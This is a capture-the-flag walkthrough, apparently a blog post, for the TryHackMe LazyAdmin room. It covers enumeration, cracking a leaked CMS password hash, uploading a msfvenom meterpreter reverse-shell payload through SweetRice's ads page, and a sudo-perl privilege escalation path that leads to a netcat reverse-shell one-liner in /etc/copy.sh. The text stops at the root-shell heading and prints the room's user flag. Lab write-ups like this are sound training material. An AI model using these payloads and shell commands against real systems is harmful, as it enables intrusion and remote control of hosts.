<p>Lab: <a href="https://tryhackme.com/room/lazyadmin">LazyAdmin</a></p>
<p>Tools: </p>
<ul>
<li><strong>nmap</strong>:  tool to find open ports, detect operating systems and discover potential vulnerabilities </li>
<li><strong>gowitness</strong>: command line tool written in Go to capture and screenshot web pages</li>
<li><strong>ffuf</strong>: web fuzzer written in Go to discover hidden or unlinked resources on a web server </li>
<li><strong>metasploit</strong>:framework for developing, testing, and executing exploits on target systems.</li>
<li><strong>msfvenom</strong>: Payload generator and encoder within the Metasploit Framework for creating custom malicious payloads.</li>
<li><strong>searchsploit</strong>: A command-line utility that interfaces with the Exploit Database (ExploitDB) .</li>
<li><strong>netcat</strong>:  Versatile networking utility for reading from and writing to network connections, often used for port scanning and transferring files.</li>
<li><strong>crackstation</strong>: an online platform that stores hashed passwords and provides other password cracking services</li>
</ul>

<p>After connecting to the network through TryHackMe&#39;s VPN. I want to make sure the target is reachable.</p>
<pre><code>ping -c <span class="hljs-number">5</span> <span class="hljs-number">10.10</span><span class="hljs-number">.198</span><span class="hljs-number">.128</span>  
PING <span class="hljs-number">10.10</span><span class="hljs-number">.198</span><span class="hljs-number">.128</span> (<span class="hljs-number">10.10</span><span class="hljs-number">.198</span><span class="hljs-number">.128</span>) <span class="hljs-number">56</span>(<span class="hljs-number">84</span>) <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">of</span> data.
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.198</span><span class="hljs-number">.128</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">222</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.198</span><span class="hljs-number">.128</span>: icmp_seq=<span class="hljs-number">2</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">214</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.198</span><span class="hljs-number">.128</span>: icmp_seq=<span class="hljs-number">3</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">216</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.198</span><span class="hljs-number">.128</span>: icmp_seq=<span class="hljs-number">4</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">219</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.198</span><span class="hljs-number">.128</span>: icmp_seq=<span class="hljs-number">5</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">224</span> ms

<span class="hljs-comment">--- 10.10.198.128 ping statistics ---</span>
<span class="hljs-number">5</span> packets transmitted, <span class="hljs-number">5</span> received, <span class="hljs-number">0</span>% packet loss, <span class="hljs-built_in">time</span> <span class="hljs-number">4009</span>ms
rtt <span class="hljs-built_in">min</span>/<span class="hljs-built_in">avg</span>/<span class="hljs-built_in">max</span>/mdev = <span class="hljs-number">213.750</span>/<span class="hljs-number">218.906</span>/<span class="hljs-number">224.133</span>/<span class="hljs-number">3.873</span> ms
</code></pre><hr>
<p><strong>Host Enumeration</strong></p>
<p>After confirming that  I can reach the target. I ran an nmap scan.</p>
<table>
<thead>
<tr>
<th>Nmap Flags</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>T5</td>
<td>Fastest scanning speed</td>
</tr>
<tr>
<td>SC</td>
<td>Runs default scripts</td>
</tr>
<tr>
<td>sV</td>
<td>Version detection on open ports</td>
</tr>
</tbody>
</table>
<pre><code>nmap -T5 -sC -sV <span class="hljs-number">10.10</span><span class="hljs-number">.198</span><span class="hljs-number">.128</span>
Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2024-01-25 15:33 EST</span>
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.198</span><span class="hljs-number">.128</span>
Host is up (<span class="hljs-number">0.22</span>s latency).
Not <span class="hljs-string">shown:</span> <span class="hljs-number">998</span> closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2<span class="hljs-number">.8</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
| ssh-<span class="hljs-string">hostkey:</span> 
|   <span class="hljs-number">2048</span> <span class="hljs-number">49</span>:<span class="hljs-number">7</span><span class="hljs-string">c:</span><span class="hljs-string">f7:</span><span class="hljs-number">41</span>:<span class="hljs-number">10</span>:<span class="hljs-number">43</span>:<span class="hljs-number">73</span>:<span class="hljs-string">da:</span><span class="hljs-number">2</span><span class="hljs-string">c:</span><span class="hljs-string">e6:</span><span class="hljs-number">38</span>:<span class="hljs-number">95</span>:<span class="hljs-number">86</span>:<span class="hljs-string">f8:</span><span class="hljs-string">e0:</span>f0 (RSA)
|   <span class="hljs-number">256</span> <span class="hljs-number">2</span><span class="hljs-string">f:</span><span class="hljs-string">d7:</span><span class="hljs-string">c4:</span><span class="hljs-number">4</span><span class="hljs-string">c:</span><span class="hljs-string">e8:</span><span class="hljs-number">1</span><span class="hljs-string">b:</span><span class="hljs-number">5</span><span class="hljs-string">a:</span><span class="hljs-number">90</span>:<span class="hljs-number">44</span>:<span class="hljs-string">df:</span><span class="hljs-string">c0:</span><span class="hljs-number">63</span>:<span class="hljs-number">8</span><span class="hljs-string">c:</span><span class="hljs-number">72</span>:<span class="hljs-string">ae:</span><span class="hljs-number">55</span> (ECDSA)
|_  <span class="hljs-number">256</span> <span class="hljs-number">61</span>:<span class="hljs-number">84</span>:<span class="hljs-number">62</span>:<span class="hljs-number">27</span>:<span class="hljs-string">c6:</span><span class="hljs-string">c3:</span><span class="hljs-number">29</span>:<span class="hljs-number">17</span>:<span class="hljs-string">dd:</span><span class="hljs-number">27</span>:<span class="hljs-number">45</span>:<span class="hljs-number">9</span><span class="hljs-string">e:</span><span class="hljs-number">29</span>:<span class="hljs-string">cb:</span><span class="hljs-number">90</span>:<span class="hljs-number">5</span>e (ED25519)
<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))
|_http-server-<span class="hljs-string">header:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)
|_http-<span class="hljs-string">title:</span> Apache2 Ubuntu Default <span class="hljs-string">Page:</span> It works
Service <span class="hljs-string">Info:</span> <span class="hljs-string">OS:</span> Linux; <span class="hljs-string">CPE:</span> <span class="hljs-string">cpe:</span>/<span class="hljs-string">o:</span><span class="hljs-string">linux:</span>linux_kernel

Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">24.50</span> seconds
</code></pre><hr>
<p><strong>Website Enumeration (Port 80)</strong></p>
<p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/90380ba1-adae-44e7-bf50-01981dae60c3" alt="http-10 10 198 128-"></p>
<p>Using ffuf to enumerate the root directory revealed one sub-directory, named content</p>
<pre><code>ffuf -w directory-list<span class="hljs-number">-2.3</span>-medium.<span class="hljs-string">txt:</span>FUZZ -u <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.198.128/FUZZ   </span>

        <span class="hljs-regexp">/'___\  /</span><span class="hljs-string">'___\           /'</span>___\       
       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       
       \ \ ,__\\ \ ,__\<span class="hljs-regexp">/\ \/\ \ \ \ </span>,__\      
        \ \ \_<span class="hljs-regexp">/ \ \ \_/\ \ \_\ \ \ \ \_</span>/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \<span class="hljs-regexp">/_/</span>    \<span class="hljs-regexp">/_/</span>   \<span class="hljs-regexp">/___/</span>    \<span class="hljs-regexp">/_/</span>       

       v2<span class="hljs-number">.1</span><span class="hljs-number">.0</span>-dev
________________________________________________

 :: <span class="hljs-string">Method           :</span> GET
 :: <span class="hljs-string">URL              :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.198.128/FUZZ</span>
 :: <span class="hljs-string">Wordlist         :</span> <span class="hljs-string">FUZZ:</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list<span class="hljs-number">-2.3</span>-medium.txt
 :: Follow <span class="hljs-string">redirects :</span> <span class="hljs-literal">false</span>
 :: <span class="hljs-string">Calibration      :</span> <span class="hljs-literal">false</span>
 :: <span class="hljs-string">Timeout          :</span> <span class="hljs-number">10</span>
 :: <span class="hljs-string">Threads          :</span> <span class="hljs-number">40</span>
 :: <span class="hljs-string">Matcher          :</span> Response <span class="hljs-string">status:</span> <span class="hljs-number">200</span><span class="hljs-number">-299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span>
________________________________________________

content                 [<span class="hljs-string">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">316</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">20</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">10</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">216</span>ms]
                        [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">11321</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">3503</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">376</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">217</span>ms]
server-status           [<span class="hljs-string">Status:</span> <span class="hljs-number">403</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">278</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">20</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">10</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">217</span>ms]
:: <span class="hljs-string">Progress:</span> [<span class="hljs-number">220546</span><span class="hljs-regexp">/220546] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">179</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">20</span>:<span class="hljs-number">56</span>] :: <span class="hljs-string">Errors:</span> <span class="hljs-number">0</span> ::
</code></pre><hr>
<p><strong>Content Directory</strong></p>
<p>Accessing the provided URL, <a href="http://10.10.198.128/content/">http://10.10.198.128/content/</a>, discloses a content management system called Sweet Rice</p>
<p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/6bb088a2-02a1-4ba0-ad75-9b62bd170d92" alt="http-10 10 198 128-content-"></p>
<p>Further enumeration revealed more subdirectories</p>
<pre><code>ffuf -w directory-list<span class="hljs-number">-2.3</span>-medium.<span class="hljs-string">txt:</span>FUZZ -u <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.198.128/content/FUZZ</span>

        <span class="hljs-regexp">/'___\  /</span><span class="hljs-string">'___\           /'</span>___\       
       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       
       \ \ ,__\\ \ ,__\<span class="hljs-regexp">/\ \/\ \ \ \ </span>,__\      
        \ \ \_<span class="hljs-regexp">/ \ \ \_/\ \ \_\ \ \ \ \_</span>/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \<span class="hljs-regexp">/_/</span>    \<span class="hljs-regexp">/_/</span>   \<span class="hljs-regexp">/___/</span>    \<span class="hljs-regexp">/_/</span>       

       v2<span class="hljs-number">.1</span><span class="hljs-number">.0</span>-dev
________________________________________________

 :: <span class="hljs-string">Method           :</span> GET
 :: <span class="hljs-string">URL              :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.198.128/content/FUZZ</span>
 :: <span class="hljs-string">Wordlist         :</span> <span class="hljs-string">FUZZ:</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list<span class="hljs-number">-2.3</span>-medium.txt
 :: Follow <span class="hljs-string">redirects :</span> <span class="hljs-literal">false</span>
 :: <span class="hljs-string">Calibration      :</span> <span class="hljs-literal">false</span>
 :: <span class="hljs-string">Timeout          :</span> <span class="hljs-number">10</span>
 :: <span class="hljs-string">Threads          :</span> <span class="hljs-number">40</span>
 :: <span class="hljs-string">Matcher          :</span> Response <span class="hljs-string">status:</span> <span class="hljs-number">200</span><span class="hljs-number">-299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span>
________________________________________________

images                  [<span class="hljs-string">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">323</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">20</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">10</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">224</span>ms]
js                      [<span class="hljs-string">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">319</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">20</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">10</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">214</span>ms]
inc                     [<span class="hljs-string">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">320</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">20</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">10</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">229</span>ms]
<span class="hljs-keyword">as</span>                      [<span class="hljs-string">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">319</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">20</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">10</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">228</span>ms]
_themes                 [<span class="hljs-string">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">324</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">20</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">10</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">236</span>ms]
attachment              [<span class="hljs-string">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">327</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">20</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">10</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">216</span>ms]
                        [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">2199</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">109</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">36</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">244</span>ms]
:: <span class="hljs-string">Progress:</span> [<span class="hljs-number">220546</span><span class="hljs-regexp">/220546] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">179</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">21</span>:<span class="hljs-number">01</span>] :: <span class="hljs-string">Errors:</span> <span class="hljs-number">0</span> :
</code></pre><hr>
<pre><code>Sweet Rice Version <span class="hljs-number">1.5</span><span class="hljs-meta">.1</span>: http://<span class="hljs-number">10.10</span><span class="hljs-meta">.198</span><span class="hljs-meta">.128</span>/content/<span class="hljs-keyword">inc</span>/lastest.txt
mysql_bakup_20191129023059-<span class="hljs-number">1.5</span><span class="hljs-meta">.1</span>.sql: http://<span class="hljs-number">10.10</span><span class="hljs-meta">.198</span><span class="hljs-meta">.128</span>/content/<span class="hljs-keyword">inc</span>/mysql_backup/
</code></pre><p><strong>mysql_bakup_20191129023059-1.5.1.sql Contents (line 79)</strong></p>
<p>The mysql file has an md5 hash. I took the hash: 42f749ade7f9e195bf475f37a44cafcb and used crackstation to get it&#39;s plaintext password Password123.</p>
<pre><code>14 =&gt; 'INSERT INTO `<span class="hljs-variable">%--%</span>_options` VALUES(<span class="hljs-symbol">\'</span>1<span class="hljs-symbol">\'</span>,<span class="hljs-symbol">\'</span>global_setting<span class="hljs-symbol">\'</span>,<span class="hljs-symbol">\'</span>a:17:{s:4:<span class="hljs-symbol">\\</span>"name<span class="hljs-symbol">\\</span>";s:25:<span class="hljs-symbol">\\</span>"Lazy Admin&amp;#039;s Website<span class="hljs-symbol">\\</span>";s:6:<span class="hljs-symbol">\\</span>"author<span class="hljs-symbol">\\</span>";s:10:<span class="hljs-symbol">\\</span>"Lazy Admin<span class="hljs-symbol">\\</span>";s:5:<span class="hljs-symbol">\\</span>"title<span class="hljs-symbol">\\</span>";s:0:<span class="hljs-symbol">\\</span>"<span class="hljs-symbol">\\</span>";s:8:<span class="hljs-symbol">\\</span>"keywords<span class="hljs-symbol">\\</span>";s:8:<span class="hljs-symbol">\\</span>"Keywords<span class="hljs-symbol">\\</span>";s:11:<span class="hljs-symbol">\\</span>"description<span class="hljs-symbol">\\</span>";s:11:<span class="hljs-symbol">\\</span>"Description<span class="hljs-symbol">\\</span>";s:5:<span class="hljs-symbol">\\</span>"admin<span class="hljs-symbol">\\</span>";s:7:<span class="hljs-symbol">\\</span>"manager<span class="hljs-symbol">\\</span>";s:6:<span class="hljs-symbol">\\</span>"passwd<span class="hljs-symbol">\\</span>";s:32:<span class="hljs-symbol">\\</span>"42f749ade7f9e195bf475f37a44cafcb<span class="hljs-symbol">\\</span>";s:5:<span class="hljs-symbol">\\</span>"close<span class="hljs-symbol">\\</span>";i:1;s:9:<span class="hljs-symbol">\\</span>"close_tip<span class="hljs-symbol">\\</span>";s:454:<span class="hljs-symbol">\\</span>"&lt;p&gt;Welcome to SweetRice - Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is building now , please come late.&lt;/h1&gt;&lt;p&gt;If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting &lt;/p&gt;&lt;p&gt;and uncheck the checkbox <span class="hljs-symbol">\\</span>"Site close<span class="hljs-symbol">\\</span>" to open your website.&lt;/p&gt;&lt;p&gt;More help at &lt;a href=<span class="hljs-symbol">\\</span>"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/<span class="hljs-symbol">\\</span>"&gt;Tip for Basic CMS SweetRice installed&lt;/a&gt;&lt;/p&gt;<span class="hljs-symbol">\\</span>";s:5:<span class="hljs-symbol">\\</span>"cache<span class="hljs-symbol">\\</span>";i:0;s:13:<span class="hljs-symbol">\\</span>"cache_expired<span class="hljs-symbol">\\</span>";i:0;s:10:<span class="hljs-symbol">\\</span>"user_track<span class="hljs-symbol">\\</span>";i:0;s:11:<span class="hljs-symbol">\\</span>"url_rewrite<span class="hljs-symbol">\\</span>";i:0;s:4:<span class="hljs-symbol">\\</span>"logo<span class="hljs-symbol">\\</span>";s:0:<span class="hljs-symbol">\\</span>"<span class="hljs-symbol">\\</span>";s:5:<span class="hljs-symbol">\\</span>"theme<span class="hljs-symbol">\\</span>";s:0:<span class="hljs-symbol">\\</span>"<span class="hljs-symbol">\\</span>";s:4:<span class="hljs-symbol">\\</span>"lang<span class="hljs-symbol">\\</span>";s:9:<span class="hljs-symbol">\\</span>"en-us.php<span class="hljs-symbol">\\</span>";s:11:<span class="hljs-symbol">\\</span>"admin_email<span class="hljs-symbol">\\</span>";N;}<span class="hljs-symbol">\'</span>,<span class="hljs-symbol">\'</span>1575023409<span class="hljs-symbol">\'</span>);',
</code></pre><p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/8b4ff299-0477-4588-883e-c29e946b43ee" alt="Pasted image 20240125172601"></p>
<pre><code><span class="hljs-symbol">manager:</span>Password123
</code></pre><p>Through prior enumeration I found the login portal</p>
<pre><code>Sweet Rice Login <span class="hljs-string">Portal:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.198.128/content/as/</span>
</code></pre><p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/25c2fcc0-41ad-4989-bace-a9c19153123f" alt="http-10 10 198 128-content-as-"></p>
<pre><code>Using <span class="hljs-keyword">the</span> following credentials I was able <span class="hljs-built_in">to</span> successfully login <span class="hljs-built_in">to</span> SweetRice <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> following credentials:

username: manager
password: Password123
</code></pre><hr>
<p><strong>Searchsploit</strong></p>
<p>Knowing the version of Sweet Rice from prior enumeration allowed me to narrow down the possible attack vectors to get an initial foothold on the target system</p>
<pre><code>searchsploit Sweet Rice <span class="hljs-number">1.5</span><span class="hljs-number">.1</span>
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
SweetRice <span class="hljs-number">1.5</span><span class="hljs-number">.1</span> - Arbitrary File Download                                                                                                                         | php/webapps/<span class="hljs-number">40698.</span>py
SweetRice <span class="hljs-number">1.5</span><span class="hljs-number">.1</span> - Arbitrary File Upload                                                                                                                           | php/webapps/<span class="hljs-number">40716.</span>py
SweetRice <span class="hljs-number">1.5</span><span class="hljs-number">.1</span> - Backup Disclosure                                                                                                                               | php/webapps/<span class="hljs-number">40718.</span>txt
SweetRice <span class="hljs-number">1.5</span><span class="hljs-number">.1</span> - Cross-Site Request Forgery                                                                                                                      | php/webapps/<span class="hljs-number">40692.</span>html
SweetRice <span class="hljs-number">1.5</span><span class="hljs-number">.1</span> - Cross-Site Request Forgery / PHP Code Execution                                                                                                 | php/webapps/<span class="hljs-number">40700.</span>html
------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------
</code></pre><p>The following command copies the file/exploit to the current directory in use</p>
<pre><code> searchsploit -m php<span class="hljs-meta-keyword">/webapps/</span><span class="hljs-number">40700.</span>html
<span class="hljs-symbol">  Exploit:</span> SweetRice <span class="hljs-number">1.5</span><span class="hljs-number">.1</span> - Cross-Site Request Forgery / PHP Code Execution
<span class="hljs-symbol">      URL:</span> https:<span class="hljs-comment">//www.exploit-db.com/exploits/40700</span>
<span class="hljs-symbol">     Path:</span> <span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/exploitdb/</span>exploits<span class="hljs-meta-keyword">/php/</span>webapps/<span class="hljs-number">40700.</span>html
<span class="hljs-symbol">    Codes:</span> N/A
<span class="hljs-symbol"> Verified:</span> True
File Type: HTML document, ASCII text
Copied to: <span class="hljs-meta-keyword">/root/</span>Desktop/Tryhackme/LazyAdmin/<span class="hljs-number">40700.</span>html
</code></pre><hr>
<p><strong>Contents of 40700.html</strong></p>
<p>To summarize, the contents of this html file, a php reverse shell can be generated</p>
<pre><code># Description :

# <span class="hljs-keyword">In</span> SweetRice CMS Panel <span class="hljs-keyword">In</span> Adding Ads Section SweetRice Allow <span class="hljs-keyword">To</span> Admin <span class="hljs-keyword">Add</span>

PHP Codes <span class="hljs-keyword">In</span> Ads File

# A CSRF Vulnerabilty <span class="hljs-keyword">In</span> Adding Ads Section Allow <span class="hljs-keyword">To</span> Attacker <span class="hljs-keyword">To</span> Execute

PHP Codes <span class="hljs-keyword">On</span> Server .

# <span class="hljs-keyword">In</span> This Exploit I Just Added a echo <span class="hljs-string">'&lt;h1&gt; Hacked &lt;/h1&gt;'</span>; phpinfo();

Code You Can

Customize Exploit <span class="hljs-keyword">For</span> Your <span class="hljs-keyword">Self</span> .
</code></pre><hr>
<p><strong>Reverse Shell Payload Creation</strong>
Using msfvenom I create a php  meterpreter reverse shell </p>
<pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.13.0.39 LPORT=4444 -f raw &gt; <span class="hljs-keyword">shell</span>.php
[-] <span class="hljs-keyword">No</span> platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] <span class="hljs-keyword">No</span> <span class="hljs-keyword">arch</span> selected, selecting <span class="hljs-keyword">arch</span>: php from the payload
<span class="hljs-keyword">No</span> encoder specified, outputting raw payload
Payload size: 34849 bytes
</code></pre><hr>
<p><strong>Starting Metasploit</strong></p>
<p>I  then start metasploit and the following commands. </p>
<pre><code>msfconsole -q                                                                         
[*] Starting persistent <span class="hljs-keyword">handler</span>(s)...
msf6 &gt; use exploit/multi/<span class="hljs-keyword">handler</span>
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; set payload php/meterpreter_reverse_tcp
payload =&gt; php/meterpreter_reverse_tcp
msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; set LHOST <span class="hljs-number">10.13</span><span class="hljs-number">.0</span><span class="hljs-number">.39</span>
LHOST =&gt; <span class="hljs-number">10.13</span><span class="hljs-number">.0</span><span class="hljs-number">.39</span>
msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; set LPORT <span class="hljs-number">4444</span>
LPORT =&gt; <span class="hljs-number">4444</span>
msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; run

[*] Started reverse TCP <span class="hljs-keyword">handler</span> on <span class="hljs-number">10.13</span><span class="hljs-number">.0</span><span class="hljs-number">.39</span>:4444
</code></pre><p>I then take the contents of the shell.php generated before and paste it at the following url</p>
<pre><code><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/10.10.198.128/content</span><span class="hljs-regexp">/as/</span>?<span class="hljs-keyword">type</span>=ad
</code></pre><p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/154f22b3-204e-4e20-84f3-9ba297d8d3e6" alt="Pasted image 20240125182510"></p>
<p>The php reverse shell is accessible at the following url. Once clicked on metasploit will catch the shell and I will now have remote access to the target machine</p>
<pre><code>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">198.128</span><span class="hljs-regexp">/content/i</span>nc<span class="hljs-regexp">/ads/</span>
</code></pre><p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/7383d701-2062-4c8e-aaed-c12ad968d4a4" alt="Pasted image 20240125182623"></p>
<hr>
<p><strong>Initial Foothold</strong> </p>
<p>The user.txt flag can be found in the /home/itguy directory</p>
<pre><code>[<span class="hljs-strong">*] Meterpreter session 1 opened (10.13.0.39:4444 -&gt; 10.10.198.128:58946) at 2024-01-25 18:26:27 -0500
meterpreter &gt; getuid
Server username: www-data

</span>meterpreter &gt; ls /home
<span class="hljs-section">Listing: /home
==============</span>

Mode              Size  Type  Last modified              Name
<span class="hljs-bullet">----              </span>----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2019-11-30 10:07:45 -0500  itguy

meterpreter &gt; cd /home/itguy
The user flag is here

meterpreter &gt; cd /home/itguy
meterpreter &gt; cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
</code></pre><hr>
<p><strong>Privilege Escalation</strong></p>
<p>The user www-data has root privileges to run perl and run a script called backup. pl</p>
<pre><code>meterpreter &gt; shell
Process <span class="hljs-number">2899</span> created.
Channel <span class="hljs-number">2</span> created.
sudo -l
Matching Defaults entries <span class="hljs-keyword">for</span> www-data on THM-<span class="hljs-symbol">Chal:</span>
    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>

User www-data may run the following commands on THM-<span class="hljs-symbol">Chal:</span>
    (ALL) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/perl /home/itguy/backup.pl
</code></pre><hr>
<p><strong>backup. pl</strong></p>
<p>The backup. pl file is a perl script that executes a shell script</p>
<pre><code>cat /home/itguy/backup.pl
<span class="hljs-meta">#!/usr/bin/perl</span>

system(<span class="hljs-string">"sh"</span>, <span class="hljs-string">"/etc/copy.sh"</span>);
</code></pre><hr>
<p><strong>copy. sh</strong></p>
<p>The copy. sh script creates a reverse shell</p>
<pre><code>cat <span class="hljs-meta-keyword">/etc/</span>copy.sh
rm <span class="hljs-meta-keyword">/tmp/</span>f;mkfifo <span class="hljs-meta-keyword">/tmp/</span>f;cat <span class="hljs-meta-keyword">/tmp/</span>f|<span class="hljs-meta-keyword">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;1</span>|nc <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.190</span> <span class="hljs-number">5554</span> &gt;<span class="hljs-meta-keyword">/tmp/</span>f
</code></pre><hr>
<p><strong>Root Reverse Shell</strong></p>
